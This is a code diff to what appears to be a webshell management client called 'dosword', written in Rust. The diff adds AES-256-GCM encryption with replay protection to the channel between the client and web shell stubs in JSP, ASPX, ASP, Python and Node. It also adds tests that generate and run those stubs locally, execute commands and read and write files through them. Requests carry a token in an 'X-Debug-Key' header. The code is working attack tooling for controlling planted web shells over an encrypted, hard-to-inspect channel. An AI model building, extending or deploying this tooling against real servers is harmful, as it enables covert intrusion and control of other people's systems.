@@ -7,11 +7,12 @@ use std::sync::{Arc, Mutex};
 use base64::Engine;
 use url::Url;
 
+use dosword_sdk::aead::AeadSession;
 use dosword_sdk::domain::{
     AppSettings, CommandOutput, DbConnection, DbProbeResult, DbQueryResult, DirListing,
     ProbeResult, ShellProfile, TargetCapabilities,
 };
-use dosword_sdk::encoder::{NativeEncoder, PayloadEncoder, md5_hex};
+use dosword_sdk::encoder::{AeadEncoder, NATIVE_XOR, PayloadEncoder, md5_hex};
 
 use super::transport::{form_escape, json_str};
 use dosword_sdk::{Protocol, ProtocolError, SessionState};
@@ -23,8 +24,10 @@ pub struct JspSession {
     pub endpoint: String,
     pub password: String,
     pub client: reqwest::blocking::Client,
-    /// JSP/ASP stub 仅支持 XOR 载荷。
+    /// 载荷编码器（native = XOR；native_aead = HKDF + AES-256-GCM）。
     pub encoder: &'static dyn PayloadEncoder,
+    /// AEAD 会话状态（仅 native_aead）：发送序号 + 接收滑动窗口。
+    pub aead: Option<Mutex<AeadSession>>,
     /// 上次探测的环境信息（current_dir / separator）。
     pub info: Mutex<Option<ProbeResult>>,
     /// 会话当前工作目录（cd 支持）。
@@ -41,21 +44,76 @@ fn build_client(settings: &AppSettings) -> reqwest::blocking::Client {
     crate::protocol::transport::build_client(settings)
 }
 
-/// 构造会话（XOR 编码器固定）。
+/// 从 `protocol_params` 选择编码器（缺省 native = XOR；仅支持 native / native_aead）。
+fn encoder_for(protocol_params: &str) -> Result<&'static dyn PayloadEncoder, ProtocolError> {
+    let id = serde_json::from_str::<serde_json::Value>(protocol_params)
+        .ok()
+        .and_then(|value| {
+            value
+                .get("encoder")
+                .and_then(|item| item.as_str().map(str::to_string))
+        })
+        .unwrap_or_else(|| "native".to_string());
+    match id.as_str() {
+        "native" => Ok(&NATIVE_XOR),
+        "native_aead" => Ok(&AeadEncoder),
+        other => Err(ProtocolError::NotSupported(format!(
+            "JSP/ASPX/ASP/Python/Node 协议仅支持 native / native_aead 编码器（当前 {other}）"
+        ))),
+    }
+}
+
+/// 构造会话（编码器由 protocol_params 决定）。
 fn make_session(
     protocol_id: &str,
     endpoint: &str,
     password: &str,
+    protocol_params: &str,
     settings: &AppSettings,
-) -> JspSession {
-    JspSession {
+) -> Result<JspSession, ProtocolError> {
+    let encoder = encoder_for(protocol_params)?;
+    // 经典 ASP（VBScript）没有内置 AES-GCM，无法生成对应的 AEAD stub：
+    // 在这里就明确拒绝，避免连上之后每条请求都失败（错误信息与生成端一致）
+    if protocol_id == "builtin.asp.v1" && encoder.id() == "native_aead" {
+        return Err(ProtocolError::NotSupported(
+            "经典 ASP（VBScript）没有内置 AES-GCM，AEAD 不可用；请改用 native（XOR）或 JSP / ASPX / Python / Node"
+                .to_string(),
+        ));
+    }
+    let aead = (encoder.id() == "native_aead").then(|| Mutex::new(AeadSession::new(password)));
+    Ok(JspSession {
         protocol_id: protocol_id.to_string(),
         endpoint: endpoint.to_string(),
         password: password.to_string(),
         client: build_client(settings),
-        encoder: &NativeEncoder { crypto: "xor" },
+        encoder,
+        aead,
         info: Mutex::new(None),
         cwd: Mutex::new(String::new()),
+    })
+}
+
+/// 统一编码入口：AEAD 走带序号的会话状态，其余走编码器本身。
+fn encode_payload(session: &JspSession, plaintext: &str) -> Result<String, ProtocolError> {
+    match &session.aead {
+        Some(aead) => aead
+            .lock()
+            .map_err(|_| ProtocolError::ParseError("AEAD 状态锁异常".into()))?
+            .seal(plaintext.as_bytes())
+            .map_err(ProtocolError::ParseError),
+        None => Ok(session.encoder.encode(plaintext, &session.password)),
+    }
+}
+
+/// 统一解码入口（响应方向；AEAD 会校验 tag 与序号窗口）。
+fn decode_payload(session: &JspSession, payload: &str) -> Result<Vec<u8>, ProtocolError> {
+    match &session.aead {
+        Some(aead) => aead
+            .lock()
+            .map_err(|_| ProtocolError::ParseError("AEAD 状态锁异常".into()))?
+            .open(payload)
+            .map_err(ProtocolError::ParseError),
+        None => session.encoder.decode(payload, &session.password),
     }
 }
 
@@ -78,7 +136,7 @@ fn form_call(
     let token = &md5_hex(&session.password)[..16];
     request.push_str(&format!(",\"token\":\"{token}\""));
     request.push('}');
-    let payload = session.encoder.encode(&request, &session.password);
+    let payload = encode_payload(session, &request)?;
     // 快速表单转义（与 php.rs 的 P2 一致）：base64 仅需转义 +、=、&
     let body = format!("formData={}", form_escape(&payload));
     let token = &md5_hex(&session.password)[..16];
@@ -138,7 +196,7 @@ fn form_call(
         .and_then(|v| v.as_str())
         .ok_or_else(|| ProtocolError::ParseError("响应缺少 data 字段".to_string()))?;
     let data = crate::protocol::transport::gunzip_if_needed(data);
-    let plain = session.encoder.decode(&data, &session.password)?;
+    let plain = decode_payload(session, &data)?;
     let value: serde_json::Value = serde_json::from_slice(&plain)
         .map_err(|_| ProtocolError::ParseError("响应内容不是合法 JSON".to_string()))?;
     if value.get("ok").and_then(|v| v.as_bool()) != Some(true) {
@@ -254,7 +312,13 @@ impl Protocol for JvmLikeProtocol {
         profile: &ShellProfile,
         settings: &AppSettings,
     ) -> Result<ProbeResult, ProtocolError> {
-        let session = make_session(self.id, &profile.endpoint, &profile.password, settings);
+        let session = make_session(
+            self.id,
+            &profile.endpoint,
+            &profile.password,
+            &profile.protocol_params,
+            settings,
+        )?;
         ensure_info(&session, settings)
     }
 
@@ -263,7 +327,13 @@ impl Protocol for JvmLikeProtocol {
         profile: &ShellProfile,
         settings: &AppSettings,
     ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
-        let session = make_session(self.id, &profile.endpoint, &profile.password, settings);
+        let session = make_session(
+            self.id,
+            &profile.endpoint,
+            &profile.password,
+            &profile.protocol_params,
+            settings,
+        )?;
         let info = ensure_info(&session, settings)?;
         if let Ok(mut cwd) = session.cwd.lock() {
             *cwd = info.current_dir.clone();
@@ -1115,8 +1185,19 @@ impl dosword_sdk::ProtocolPlugin for AspProtocol {
 
 /// 环境信息缓存（供 connect 后的文件操作取 cwd/separator）。
 /// 供命令层使用的辅助：构造临时会话。
-pub fn _temp_session(endpoint: &str, password: &str, settings: &AppSettings) -> JspSession {
-    make_session("builtin.jsp.v1", endpoint, password, settings)
+pub fn _temp_session(
+    endpoint: &str,
+    password: &str,
+    protocol_params: &str,
+    settings: &AppSettings,
+) -> Result<JspSession, ProtocolError> {
+    make_session(
+        "builtin.jsp.v1",
+        endpoint,
+        password,
+        protocol_params,
+        settings,
+    )
 }
 
 /// 供命令层使用的辅助：会话里的端信息。
@@ -1601,6 +1682,7 @@ impl dosword_sdk::ProtocolPlugin for NodeProtocol {
 mod tests {
     use super::*;
     use dosword_sdk::domain::AppSettings;
+    use dosword_sdk::encoder::NativeEncoder;
 
     /// Python 模拟 JSP stub（同协议：XOR + hash 分发 + formData + X-Debug-Key）。
     const JSP_MOCK: &str = r#"
@@ -1926,6 +2008,610 @@ HTTPServer(("127.0.0.1", port), Hd).serve_forever()
         let _ = child.wait();
         let _ = std::fs::remove_dir_all(&dir);
         result.unwrap_or_else(|error| panic!("Python stub 端到端应成功：{error}"));
+    }
+
+    /// 直接向 AEAD stub POST 一帧，并按响应方向解密（用于重放测试）。
+    fn post_aead_frame(url: &str, frame: &str) -> Result<serde_json::Value, String> {
+        let body = format!(
+            "formData={}",
+            crate::protocol::transport::form_escape(frame)
+        );
+        let token = &dosword_sdk::encoder::md5_hex("secret")[..16];
+        let response = reqwest::blocking::Client::new()
+            .post(url)
+            .header("Content-Type", "application/x-www-form-urlencoded")
+            .header("X-Debug-Key", token)
+            .body(body)
+            .send()
+            .map_err(|error| error.to_string())?;
+        let text = response.text().map_err(|error| error.to_string())?;
+        let outer: serde_json::Value =
+            serde_json::from_str(&text).map_err(|error| error.to_string())?;
+        let data = outer
+            .get("data")
+            .and_then(|item| item.as_str())
+            .ok_or_else(|| format!("响应缺少 data：{text}"))?;
+        let key = dosword_sdk::aead::derive_key("secret");
+        let (_, plain) = dosword_sdk::aead::open(&key, dosword_sdk::aead::DIR_RESPONSE, data)?;
+        serde_json::from_slice(&plain).map_err(|error| error.to_string())
+    }
+
+    /// AEAD 重放：同一帧第二次必须被目标拒绝（`replay`）。
+    fn assert_replay_rejected(url: &str) {
+        let mut client = dosword_sdk::aead::AeadSession::new("secret");
+        let token = &dosword_sdk::encoder::md5_hex("secret")[..16];
+        let request = format!(r#"{{"a":"probe","token":"{token}"}}"#);
+        let frame = client.seal(request.as_bytes()).expect("封装请求");
+        let first = post_aead_frame(url, &frame).expect("首帧应成功");
+        assert_eq!(first["ok"], serde_json::json!(true), "{first}");
+        let second = post_aead_frame(url, &frame).expect("重放帧应返回可解密的错误响应");
+        assert_eq!(second["ok"], serde_json::json!(false), "{second}");
+        assert!(
+            second["error"]
+                .as_str()
+                .unwrap_or_default()
+                .contains("replay"),
+            "应报告 replay：{second}"
+        );
+    }
+
+    /// AEAD（JSP）：把 stub 的 `<%! %>` 声明块抽出编译为普通 Java 类，
+    /// 与 Rust 实现做双向互操作 + 重放拒绝（无需 servlet 容器）。
+    #[test]
+    fn aead_jsp_crypto_interop() {
+        if std::process::Command::new("javac")
+            .arg("-version")
+            .output()
+            .is_err()
+        {
+            eprintln!("跳过：无 javac");
+            return;
+        }
+        let stub = dosword_sdk::encoder::AeadEncoder
+            .stub("jsp", "secret")
+            .expect("生成 JSP AEAD stub");
+        let start = stub.find("<%!").expect("声明块起点") + 3;
+        let end = start + stub[start..].find("%>").expect("声明块终点");
+        let decls = &stub[start..end];
+        // 页面脚本片段（`<% ... %>`）：用桩类型包一层，做**编译期**校验
+        let sstart = stub.rfind("<%").expect("脚本片段起点") + 2;
+        let send = sstart + stub[sstart..].find("%>").expect("脚本片段终点");
+        let scriptlet = &stub[sstart..send];
+        assert!(
+            scriptlet.contains("formData"),
+            "脚本片段抽取失败：{scriptlet}"
+        );
+        let dir = std::env::temp_dir().join(format!("dosword-jsp-aead-{}", uuid::Uuid::new_v4()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let harness = format!(
+            r#"
+import java.io.*;
+import java.util.*;
+import java.nio.charset.*;
+class DSW_Req {{ String getHeader(String n) {{ return null; }} String getParameter(String n) {{ return null; }} }}
+class DSW_Resp {{ void setStatus(int c) {{}} }}
+class DSW_Out {{ void print(String s) {{}} }}
+public class StubTest {{
+{decls}
+  static void DSW_page(DSW_Req request, DSW_Resp response, DSW_Out out) throws Exception {{
+{scriptlet}
+  }}
+  public static void main(String[] args) throws Exception {{
+    String req = args[0];
+    byte[] sealedFrame = DSW_aeadSeal(req.getBytes("UTF-8"));
+    System.out.println("SEALED:" + java.util.Base64.getEncoder().encodeToString(sealedFrame));
+    byte[] frame = java.util.Base64.getDecoder().decode(args[1]);
+    System.out.println("OPENED:" + new String(DSW_aeadOpen(frame), "UTF-8"));
+    try {{ DSW_aeadOpen(frame); System.out.println("REPLAY-ACCEPTED"); }}
+    catch (Exception e) {{ System.out.println("REPLAY-REJECTED"); }}
+  }}
+}}
+"#
+        );
+        std::fs::write(dir.join("StubTest.java"), harness).unwrap();
+        let compile = std::process::Command::new("javac")
+            .arg("-encoding")
+            .arg("UTF-8")
+            .arg("-d")
+            .arg(&dir)
+            .arg(dir.join("StubTest.java"))
+            .output()
+            .expect("运行 javac");
+        assert!(
+            compile.status.success(),
+            "JSP AEAD 声明块编译失败：{}{}",
+            String::from_utf8_lossy(&compile.stdout),
+            String::from_utf8_lossy(&compile.stderr)
+        );
+        // Rust → Java
+        let request = r#"{"a":"probe"}"#;
+        let mut client = dosword_sdk::aead::AeadSession::new("secret");
+        let frame = client.seal(request.as_bytes()).expect("封装请求");
+        let run = std::process::Command::new("java")
+            .arg("-cp")
+            .arg(&dir)
+            .arg("StubTest")
+            .arg(request)
+            .arg(&frame)
+            .output()
+            .expect("运行 java");
+        let _ = std::fs::remove_dir_all(&dir);
+        assert!(
+            run.status.success(),
+            "JSP AEAD 运行失败：{}",
+            String::from_utf8_lossy(&run.stderr)
+        );
+        let text = String::from_utf8_lossy(&run.stdout);
+        let sealed = text
+            .lines()
+            .find_map(|line| line.strip_prefix("SEALED:"))
+            .unwrap_or_else(|| panic!("缺少 SEALED 行：{text}"));
+        let opened = text
+            .lines()
+            .find_map(|line| line.strip_prefix("OPENED:"))
+            .unwrap_or_else(|| panic!("缺少 OPENED 行：{text}"));
+        assert_eq!(opened, request, "Java 应能解开 Rust 帧");
+        assert!(text.contains("REPLAY-REJECTED"), "Java 应拒绝重放：{text}");
+        // Java → Rust
+        let key = dosword_sdk::aead::derive_key("secret");
+        let (_, plain) = dosword_sdk::aead::open(&key, dosword_sdk::aead::DIR_RESPONSE, sealed)
+            .expect("Rust 应能解开 Java 帧");
+        assert_eq!(String::from_utf8_lossy(&plain), request);
+    }
+
+    /// AEAD（ASPX）：抽出 `<script runat="server">` 声明块，用 dotnet 编译运行
+    /// 做双向互操作 + 重放拒绝（无需 IIS；纯托管 AES-GCM 实现）。
+    #[test]
+    fn aead_aspx_crypto_interop() {
+        if std::process::Command::new("dotnet")
+            .arg("--version")
+            .output()
+            .is_err()
+        {
+            eprintln!("跳过：无 dotnet");
+            return;
+        }
+        let stub = dosword_sdk::encoder::AeadEncoder
+            .stub("aspx", "secret")
+            .expect("生成 ASPX AEAD stub");
+        let start = stub.find("<script runat=\"server\">").expect("script 起点")
+            + "<script runat=\"server\">".len();
+        let end = stub.find("</script>").expect("script 终点");
+        let decls = &stub[start..end];
+        // 页面脚本片段（`<% ... %>`）：用桩类型包一层，做**编译期**校验
+        let sstart = stub[end..].find("<%").expect("脚本片段起点") + end + 2;
+        let send = sstart + stub[sstart..].find("%>").expect("脚本片段终点");
+        let scriptlet = &stub[sstart..send];
+        assert!(
+            scriptlet.contains("formData"),
+            "脚本片段抽取失败：{scriptlet}"
+        );
+        let dir = std::env::temp_dir().join(format!("dosword-aspx-aead-{}", uuid::Uuid::new_v4()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let program = format!(
+            r#"using System;
+using System.IO;
+using System.Text;
+using System.Diagnostics;
+using System.Security.Cryptography;
+class DSW_Req {{
+  public System.Collections.Generic.Dictionary<string, string> Headers = new System.Collections.Generic.Dictionary<string, string>();
+  public System.Collections.Generic.Dictionary<string, string> ServerVariables = new System.Collections.Generic.Dictionary<string, string>();
+  public string this[string k] {{ get {{ return null; }} }}
+}}
+class DSW_Resp {{ public int StatusCode; public void End() {{}} public void Write(string s) {{}} }}
+class StubTest {{
+{decls}
+  static void DSW_page(DSW_Req Request, DSW_Resp Response) {{
+{scriptlet}
+  }}
+  static void Main(string[] args) {{
+    string req = args[0];
+    byte[] sealedFrame = DSW_aeadSeal(Encoding.UTF8.GetBytes(req));
+    Console.WriteLine("SEALED:" + Convert.ToBase64String(sealedFrame));
+    byte[] frame = Convert.FromBase64String(args[1]);
+    Console.WriteLine("OPENED:" + Encoding.UTF8.GetString(DSW_aeadOpen(frame)));
+    try {{ DSW_aeadOpen(frame); Console.WriteLine("REPLAY-ACCEPTED"); }}
+    catch (Exception) {{ Console.WriteLine("REPLAY-REJECTED"); }}
+  }}
+}}
+"#
+        );
+        std::fs::write(dir.join("Program.cs"), &program).unwrap();
+        let new_project = std::process::Command::new("dotnet")
+            .arg("new")
+            .arg("console")
+            .arg("-o")
+            .arg(&dir)
+            .arg("--force")
+            .output()
+            .expect("运行 dotnet new");
+        if !new_project.status.success() {
+            eprintln!(
+                "跳过 ASPX AEAD：dotnet new 失败：{}",
+                String::from_utf8_lossy(&new_project.stderr)
+            );
+            let _ = std::fs::remove_dir_all(&dir);
+            return;
+        }
+        // dotnet new 可能覆盖 Program.cs：重新写入
+        std::fs::write(dir.join("Program.cs"), program).unwrap();
+        let request = r#"{"a":"probe"}"#;
+        let mut client = dosword_sdk::aead::AeadSession::new("secret");
+        let frame = client.seal(request.as_bytes()).expect("封装请求");
+        let run = std::process::Command::new("dotnet")
+            .arg("run")
+            .arg("--project")
+            .arg(&dir)
+            .arg("--")
+            .arg(request)
+            .arg(&frame)
+            .output()
+            .expect("运行 dotnet run");
+        assert!(
+            run.status.success(),
+            "ASPX AEAD 运行失败：{}{}",
+            String::from_utf8_lossy(&run.stdout),
+            String::from_utf8_lossy(&run.stderr)
+        );
+        let text = String::from_utf8_lossy(&run.stdout);
+        let sealed = text
+            .lines()
+            .find_map(|line| line.strip_prefix("SEALED:"))
+            .unwrap_or_else(|| panic!("缺少 SEALED 行：{text}"));
+        let opened = text
+            .lines()
+            .find_map(|line| line.strip_prefix("OPENED:"))
+            .unwrap_or_else(|| panic!("缺少 OPENED 行：{text}"));
+        assert_eq!(opened, request, "C# 应能解开 Rust 帧");
+        assert!(text.contains("REPLAY-REJECTED"), "C# 应拒绝重放：{text}");
+        let key = dosword_sdk::aead::derive_key("secret");
+        let (_, plain) = dosword_sdk::aead::open(&key, dosword_sdk::aead::DIR_RESPONSE, sealed)
+            .expect("Rust 应能解开 C# 帧");
+        assert_eq!(String::from_utf8_lossy(&plain), request);
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// 抽出 JSP stub 的声明块与脚本片段，包成一个可编译的普通 Java 类。
+    ///
+    /// 脚本片段用桩类型承接 servlet 隐式对象（request/response/out），
+    /// 因此能在**无容器**环境下做编译期校验（历史上转义错误导致整份 stub
+    /// 根本无法编译，且没有任何测试能发现）。
+    fn jsp_compile_harness(stub: &str, class: &str) -> String {
+        let start = stub.find("<%!").expect("声明块起点") + 3;
+        let end = start + stub[start..].find("%>").expect("声明块终点");
+        let decls = &stub[start..end];
+        let sstart = stub.rfind("<%").expect("脚本片段起点") + 2;
+        let send = sstart + stub[sstart..].find("%>").expect("脚本片段终点");
+        let scriptlet = &stub[sstart..send];
+        assert!(scriptlet.contains("formData"), "脚本片段抽取失败");
+        format!(
+            r#"
+import java.io.*;
+import java.util.*;
+import java.nio.charset.*;
+class DSW_Req {{ String getHeader(String n) {{ return null; }} String getParameter(String n) {{ return null; }} }}
+class DSW_Resp {{ void setStatus(int c) {{}} }}
+class DSW_Out {{ void print(String s) {{}} }}
+public class {class} {{
+{decls}
+  static void DSW_page(DSW_Req request, DSW_Resp response, DSW_Out out) throws Exception {{
+{scriptlet}
+  }}
+}}
+"#
+        )
+    }
+
+    fn javac_available() -> bool {
+        std::process::Command::new("javac")
+            .arg("-version")
+            .output()
+            .is_ok()
+    }
+
+    fn dotnet_available() -> bool {
+        std::process::Command::new("dotnet")
+            .arg("--version")
+            .output()
+            .is_ok()
+    }
+
+    /// 编译期校验一份 JSP stub（返回 javac 输出）。
+    fn compile_jsp_stub(stub: &str, class: &str) -> std::process::Output {
+        let dir = std::env::temp_dir().join(format!(
+            "dosword-{}-{}",
+            class.to_lowercase(),
+            uuid::Uuid::new_v4()
+        ));
+        std::fs::create_dir_all(&dir).unwrap();
+        let file = dir.join(format!("{class}.java"));
+        std::fs::write(&file, jsp_compile_harness(stub, class)).unwrap();
+        let output = std::process::Command::new("javac")
+            .arg("-encoding")
+            .arg("UTF-8")
+            .arg("-d")
+            .arg(&dir)
+            .arg(&file)
+            .output()
+            .expect("运行 javac");
+        let _ = std::fs::remove_dir_all(&dir);
+        output
+    }
+
+    /// 抽出 ASPX stub 的 `<script runat="server">` 声明块与脚本片段，
+    /// 用桩类型承接 Page 成员（Request/Response），包成可编译的 C# 类。
+    fn aspx_compile_harness(stub: &str, class: &str) -> String {
+        let marker = "<script runat=\"server\">";
+        let start = stub.find(marker).expect("script 起点") + marker.len();
+        let end = stub.find("</script>").expect("script 终点");
+        let decls = &stub[start..end];
+        let sstart = stub[end..].find("<%").expect("脚本片段起点") + end + 2;
+        let send = sstart + stub[sstart..].find("%>").expect("脚本片段终点");
+        let scriptlet = &stub[sstart..send];
+        assert!(scriptlet.contains("formData"), "脚本片段抽取失败");
+        format!(
+            r#"using System;
+using System.IO;
+using System.Text;
+using System.Diagnostics;
+using System.Security.Cryptography;
+class DSW_Req {{
+  public System.Collections.Generic.Dictionary<string, string> Headers = new System.Collections.Generic.Dictionary<string, string>();
+  public System.Collections.Generic.Dictionary<string, string> ServerVariables = new System.Collections.Generic.Dictionary<string, string>();
+  public string this[string k] {{ get {{ return null; }} }}
+}}
+class DSW_Resp {{ public int StatusCode; public void End() {{}} public void Write(string s) {{}} }}
+class {class} {{
+{decls}
+  static void DSW_page(DSW_Req Request, DSW_Resp Response) {{
+{scriptlet}
+  }}
+  static void Main() {{}}
+}}
+"#
+        )
+    }
+
+    /// 编译期校验一份 ASPX stub（返回 dotnet 输出；无 dotnet 时返回 None）。
+    fn compile_aspx_stub(stub: &str, class: &str) -> Option<std::process::Output> {
+        if !dotnet_available() {
+            return None;
+        }
+        let dir = std::env::temp_dir().join(format!(
+            "dosword-{}-{}",
+            class.to_lowercase(),
+            uuid::Uuid::new_v4()
+        ));
+        std::fs::create_dir_all(&dir).unwrap();
+        let created = std::process::Command::new("dotnet")
+            .arg("new")
+            .arg("console")
+            .arg("-o")
+            .arg(&dir)
+            .arg("--force")
+            .output()
+            .expect("运行 dotnet new");
+        if !created.status.success() {
+            let _ = std::fs::remove_dir_all(&dir);
+            return None;
+        }
+        std::fs::write(dir.join("Program.cs"), aspx_compile_harness(stub, class)).unwrap();
+        let output = std::process::Command::new("dotnet")
+            .current_dir(&dir)
+            .arg("build")
+            .arg("--nologo")
+            .arg("-v")
+            .arg("q")
+            .output()
+            .expect("运行 dotnet build");
+        let _ = std::fs::remove_dir_all(&dir);
+        Some(output)
+    }
+
+    /// NATIVE（XOR）变体与 AEAD 变体共用同一 JSP / ASPX 模板：
+    /// 这里对 native 变体做编译期校验（AEAD 变体由上面的互操作测试覆盖）。
+    #[test]
+    fn native_jsp_aspx_stubs_compile() {
+        if !javac_available() {
+            eprintln!("跳过 JSP：无 javac");
+        } else {
+            let stub = NativeEncoder { crypto: "xor" }
+                .stub("jsp", "secret")
+                .expect("生成 JSP native stub");
+            let output = compile_jsp_stub(&stub, "StubTestNativeJsp");
+            assert!(
+                output.status.success(),
+                "JSP native stub 编译失败：{}{}",
+                String::from_utf8_lossy(&output.stdout),
+                String::from_utf8_lossy(&output.stderr)
+            );
+        }
+        let stub = NativeEncoder { crypto: "xor" }
+            .stub("aspx", "secret")
+            .expect("生成 ASPX native stub");
+        match compile_aspx_stub(&stub, "StubTestNativeAspx") {
+            None => eprintln!("跳过 ASPX：无 dotnet"),
+            Some(output) => assert!(
+                output.status.success(),
+                "ASPX native stub 编译失败：{}{}",
+                String::from_utf8_lossy(&output.stdout),
+                String::from_utf8_lossy(&output.stderr)
+            ),
+        }
+    }
+
+    /// 经典 ASP 没有内置 AES-GCM：连接前就明确拒绝（与生成端同因），
+    /// 其余四种语言的 AEAD 会话可正常建立。
+    #[test]
+    fn asp_aead_rejected_before_connect() {
+        let settings = settings();
+        let params = r#"{"encoder":"native_aead"}"#;
+        let error = make_session(
+            "builtin.asp.v1",
+            "http://127.0.0.1:1/x.asp",
+            "secret",
+            params,
+            &settings,
+        )
+        .err()
+        .expect("经典 ASP + AEAD 应拒绝");
+        assert!(error.to_string().contains("AES-GCM"), "{error}");
+        for id in [
+            "builtin.jsp.v1",
+            "builtin.aspnet.v1",
+            "builtin.python.v1",
+            "builtin.node.v1",
+        ] {
+            let session = make_session(id, "http://127.0.0.1:1/x", "secret", params, &settings)
+                .unwrap_or_else(|error| panic!("{id} 应可建立 AEAD 会话：{error}"));
+            assert!(session.aead.is_some(), "{id} 应启用 AEAD 通道");
+        }
+    }
+
+    /// AEAD：Node stub 端到端（连接/命令/文件/分块）+ 重放拒绝。
+    #[test]
+    fn aead_node_stub_round_trip_and_replay() {
+        if std::process::Command::new("node")
+            .arg("--version")
+            .output()
+            .is_err()
+        {
+            eprintln!("跳过：无 node");
+            return;
+        }
+        let settings = settings();
+        let stub = dosword_sdk::encoder::AeadEncoder
+            .stub("node", "secret")
+            .expect("生成 AEAD node stub");
+        let dir = std::env::temp_dir().join(format!("dosword-node-aead-{}", uuid::Uuid::new_v4()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let script = dir.join("shell.js");
+        std::fs::write(&script, &stub).unwrap();
+        let port = {
+            use std::net::TcpListener;
+            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+            listener.local_addr().unwrap().port()
+        };
+        let child = std::process::Command::new("node")
+            .arg(&script)
+            .env("PORT", port.to_string())
+            .current_dir(&dir)
+            .stdout(std::process::Stdio::null())
+            .stderr(std::process::Stdio::null())
+            .spawn();
+        let Some(mut child) = child.ok() else {
+            eprintln!("跳过 node AEAD 往返：未检测到 node 可执行文件");
+            return;
+        };
+        if !crate::protocol::wait_http_ready(port, 10_000) {
+            eprintln!("跳过 node AEAD 往返：服务器未就绪");
+            let _ = child.kill();
+            return;
+        }
+        let url = format!("http://127.0.0.1:{port}/");
+        let mut p = profile(&url);
+        p.protocol_id = "builtin.node.v1".into();
+        p.protocol_params = r#"{"encoder":"native_aead"}"#.into();
+        let protocol = NodeProtocol;
+        let result = (|| -> Result<(), ProtocolError> {
+            let (session, probe) = protocol.connect(&p, &settings)?;
+            assert_eq!(probe.status, "online");
+            let out = protocol.execute_command(session.as_ref(), "printf aead-node", &settings)?;
+            assert!(out.stdout.contains("aead-node"), "{}", out.stdout);
+            protocol.list_dir(session.as_ref(), &dir.to_string_lossy(), &settings)?;
+            let file = format!("{}/node_aead.txt", dir.display());
+            protocol.write_file(session.as_ref(), &file, b"hello aead", &settings)?;
+            assert_eq!(
+                protocol.read_file(session.as_ref(), &file, &settings)?,
+                b"hello aead"
+            );
+            protocol.write_file(session.as_ref(), &file, b"0123456789", &settings)?;
+            assert_eq!(
+                protocol.read_chunk(session.as_ref(), &file, 3, 4, &settings)?,
+                b"3456"
+            );
+            assert_replay_rejected(&url);
+            Ok(())
+        })();
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir);
+        result.unwrap_or_else(|error| panic!("Node AEAD stub 端到端应成功：{error}"));
+    }
+
+    /// AEAD：Python CGI stub 端到端 + 重放拒绝。
+    #[test]
+    fn aead_python_stub_round_trip_and_replay() {
+        if std::process::Command::new("python3")
+            .arg("--version")
+            .output()
+            .is_err()
+        {
+            eprintln!("跳过：无 python3");
+            return;
+        }
+        let settings = settings();
+        let stub = dosword_sdk::encoder::AeadEncoder
+            .stub("python", "secret")
+            .expect("生成 AEAD python stub");
+        let dir = std::env::temp_dir().join(format!("dosword-py-aead-{}", uuid::Uuid::new_v4()));
+        let cgi = dir.join("cgi-bin");
+        std::fs::create_dir_all(&cgi).unwrap();
+        let script = cgi.join("shell.py");
+        std::fs::write(&script, &stub).unwrap();
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            let _ = std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755));
+        }
+        let port = {
+            use std::net::TcpListener;
+            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+            listener.local_addr().unwrap().port()
+        };
+        let child = std::process::Command::new("python3")
+            .arg("-m")
+            .arg("http.server")
+            .arg("--cgi")
+            .arg(port.to_string())
+            .arg("--directory")
+            .arg(&dir)
+            .stdout(std::process::Stdio::null())
+            .stderr(std::process::Stdio::null())
+            .spawn();
+        let Some(mut child) = child.ok() else {
+            eprintln!("跳过 python AEAD 往返");
+            return;
+        };
+        if !crate::protocol::wait_http_ready(port, 10_000) {
+            eprintln!("跳过 python AEAD 往返：服务器未就绪");
+            let _ = child.kill();
+            return;
+        }
+        let url = format!("http://127.0.0.1:{port}/cgi-bin/shell.py");
+        let mut p = profile(&url);
+        p.protocol_id = "builtin.python.v1".into();
+        p.protocol_params = r#"{"encoder":"native_aead"}"#.into();
+        let protocol = PythonProtocol;
+        let result = (|| -> Result<(), ProtocolError> {
+            let (session, probe) = protocol.connect(&p, &settings)?;
+            assert_eq!(probe.status, "online");
+            let out = protocol.execute_command(session.as_ref(), "printf aead-py", &settings)?;
+            assert!(out.stdout.contains("aead-py"), "{}", out.stdout);
+            let file = format!("{}/py_aead.txt", dir.display());
+            protocol.write_file(session.as_ref(), &file, b"hello aead", &settings)?;
+            assert_eq!(
+                protocol.read_file(session.as_ref(), &file, &settings)?,
+                b"hello aead"
+            );
+            assert_replay_rejected(&url);
+            Ok(())
+        })();
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir);
+        result.unwrap_or_else(|error| panic!("Python AEAD stub 端到端应成功：{error}"));
     }
 
     #[test]
